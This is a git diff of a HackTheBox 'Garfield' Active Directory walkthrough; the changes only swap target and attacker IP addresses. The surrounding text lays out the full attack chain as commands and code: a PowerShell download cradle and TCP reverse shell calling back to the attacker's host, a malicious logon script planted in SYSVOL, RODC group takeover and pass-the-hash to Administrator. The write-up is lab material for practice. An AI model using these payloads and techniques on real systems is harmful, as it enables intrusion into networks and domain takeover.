@@ -31,7 +31,7 @@ Garfield, a hard difficulty HackTheBox Windows machine dealing with Active Direc
 As usual, we kick things off with a full TCP port scan against the target.
 
 ```bash
-nmap -sC -sV -p- --min-rate 5000 10.129.22.139
+nmap -sC -sV -p- --min-rate 5000 10.129.99.45
 ```
 
 ![nmap scan](images/00-nmap_scan.png)
@@ -66,7 +66,7 @@ Added the domain to `/etc/hosts`:
 As is common for real‑life Active Directory assessments, this box starts with a set of **assumed‑breach credentials** for the account `j.arbuckle`. The first thing to try is WinRM directly — it doesn't work — so we pivot to validating the creds over SMB instead:
 
 ```bash
-netexec smb 10.129.22.139 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
+netexec smb 10.129.99.45 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
 ```
 
 ![valid smb creds](images/04-smb_shares.png)
@@ -74,7 +74,7 @@ netexec smb 10.129.22.139 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
 Credentials check out. Enumerating available shares shows nothing unusual at first glance — just the default `ADMIN$`, `C$`, `IPC$`, `NETLOGON` and `SYSVOL`:
 
 ```bash
-netexec smb 10.129.22.139 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
+netexec smb 10.129.99.45 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
 ```
 
 ![smb shares](images/05-ldap_users.png)
@@ -82,7 +82,7 @@ netexec smb 10.129.22.139 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
 Next, enumerate domain users over LDAP:
 
 ```bash
-netexec ldap 10.129.22.139 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
+netexec ldap 10.129.99.45 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
 ```
 
 ![ldap users](images/06-bloodhound_collection.png)
@@ -95,7 +95,7 @@ Only 7 domain users, but two entries stand out immediately:
 Collecting data for BloodHound:
 
 ```bash
-bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -ns 10.129.22.139 -c all
+bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -ns 10.129.99.45 -c all
 ```
 
 ![bloodhound collection](images/08-prp_group_empty.png)
@@ -109,7 +109,7 @@ BloodHound itself doesn't reveal an obvious attack path right away beyond `j.arb
 Since `krbtgt_8245` hinted at an RODC, let's pull its AD object directly over LDAP:
 
 ```bash
-ldapsearch -x -H ldap://10.129.22.139 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' \
+ldapsearch -x -H ldap://10.129.99.45 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' \
   -b 'DC=garfield,DC=htb' '(primaryGroupID=521)' -LLL
 ```
 
@@ -129,7 +129,7 @@ In short: **if we can get our hands on the RODC's krbtgt key, or compromise the 
 Checking who belongs to the *Allowed RODC Password Replication Group*:
 
 ```bash
-ldapsearch -x -H ldap://10.129.22.139 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' \
+ldapsearch -x -H ldap://10.129.99.45 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' \
   -b 'DC=garfield,DC=htb' '(cn=Allowed RODC Password Replication Group)' member -LLL
 ```
 
@@ -150,7 +150,7 @@ Looking at the BloodHound data for ACLs on `RODC01` and on `l.wilson` shows no d
 Going back to basics: `SYSVOL` is a share present on every Domain Controller, containing Group Policy Objects and logon/logoff scripts. Let's pull its contents down:
 
 ```bash
-smbclient //10.129.22.139/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
+smbclient //10.129.99.45/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
   -c 'recurse ON; prompt OFF; mget *'
 ```
 
@@ -187,7 +187,7 @@ No account lockout policy and no complexity requirement — handy to know, thoug
 The real breakthrough comes from testing **write access** to `SYSVOL`:
 
 ```bash
-smbclient //10.129.22.139/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
+smbclient //10.129.99.45/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
   -c 'cd garfield.htb\scripts; put /tmp/test.txt test.txt'
 ```
 
@@ -209,7 +209,7 @@ The **IT Support** group holds `ReadProperty`/`WriteProperty` rights over the **
 Because the reverse‑shell one‑liner contains characters (`'`, `(`, `)`, `;`) that break inside a `.bat` file, we base64‑encode a UTF‑16LE PowerShell command instead — a standard `-EncodedCommand` payload that just downloads and runs a second‑stage script:
 
 ```bash
-PAYLOAD=$(echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.78:8000/shell.ps1')" \
+PAYLOAD=$(echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.88:8000/shell.ps1')" \
   | iconv -t UTF-16LE | base64 -w 0)
 echo -e "@echo off\npowershell -enc $PAYLOAD" > /tmp/evil.bat
 ```
@@ -227,7 +227,7 @@ powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwA
 The `.ps1` it fetches is a minimal interactive PowerShell reverse shell over raw TCP, connecting back on port 443:
 
 ```powershell
-$c = New-Object System.Net.Sockets.TCPClient('10.10.15.78',443)
+$c = New-Object System.Net.Sockets.TCPClient('10.10.15.88',443)
 $s = $c.GetStream()
 [byte[]]$b = 0..65535|%{0}
 while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
@@ -267,7 +267,7 @@ sudo nc -nlvp 443
 Upload `evil.bat` to the `scripts` folder in SYSVOL:
 
 ```bash
-smbclient //10.129.22.139/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
+smbclient //10.129.99.45/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
   -c 'cd garfield.htb\scripts; put /tmp/evil.bat evil.bat'
 ```
 ![uploading evil.bat](images/23-uploading.png)
@@ -276,7 +276,7 @@ And finally point `l.wilson`'s `scriptPath` at it, via LDAP:
 
 ```python
 import ldap3
-s = ldap3.Server('10.129.22.139')
+s = ldap3.Server('10.129.99.45')
 c = ldap3.Connection(s, 'garfield.htb\\j.arbuckle', 'Th1sD4mnC4t!@1978', authentication=ldap3.NTLM)
 c.bind()
 c.modify('CN=Liz Wilson,CN=Users,DC=garfield,DC=htb',
@@ -310,7 +310,7 @@ Set-ADAccountPassword -Identity l.wilson_adm -Reset `
 Verify and grab the flag via Evil‑WinRM:
 
 ```bash
-evil-winrm -i 10.129.22.139 -u 'l.wilson_adm' -p 'WhoKnows123!'
+evil-winrm -i 10.129.99.45 -u 'l.wilson_adm' -p 'WhoKnows123!'
 ```
 
 ![user flag retrieved](images/28-found_user.txt.png)
@@ -326,7 +326,7 @@ BloodHound shows that `l.wilson_adm` has an `AddSelf` privilege against the **RO
 ### 6.1 Taking Over RODC Administrators
 
 ```bash
-bloodyAD --host 10.129.22.139 -d garfield.htb -u l.wilson_adm -p 'WhoKnows123!' \
+bloodyAD --host 10.129.99.45 -d garfield.htb -u l.wilson_adm -p 'WhoKnows123!' \
   add groupMember "RODC Administrators" l.wilson_adm
 ```
 
@@ -346,7 +346,7 @@ Create the fake machine account:
 
 ```bash
 impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
-  -computer-name 'FAKE01$' -computer-pass 'Fake2026!' -dc-ip 10.129.22.139
+  -computer-name 'FAKE01$' -computer-pass 'Fake2026!' -dc-ip 10.129.99.45
 ```
 
 ![adding FAKE01$ computer account](images/30-adding_fake.png)
@@ -375,7 +375,7 @@ So we need to:
 
 ```python
 import ldap3
-s = ldap3.Server('10.129.22.139')
+s = ldap3.Server('10.129.99.45')
 c = ldap3.Connection(s, 'garfield.htb\\l.wilson_adm', 'WhoKnows123!', authentication=ldap3.NTLM)
 c.bind()
 
@@ -451,7 +451,7 @@ Password Hash : EE238F6DEBC752010428F20875B092D5
 With the NTLM hash in hand, pass‑the‑hash straight into Evil‑WinRM as `Administrator`:
 
 ```bash
-evil-winrm -i 10.129.22.139 -u Administrator -H EE238F6DEBC752010428F20875B092D5
+evil-winrm -i 10.129.99.45 -u Administrator -H EE238F6DEBC752010428F20875B092D5
 ```
 
 ![root shell and flag](images/35-found_root_by_evil_winrm.png)
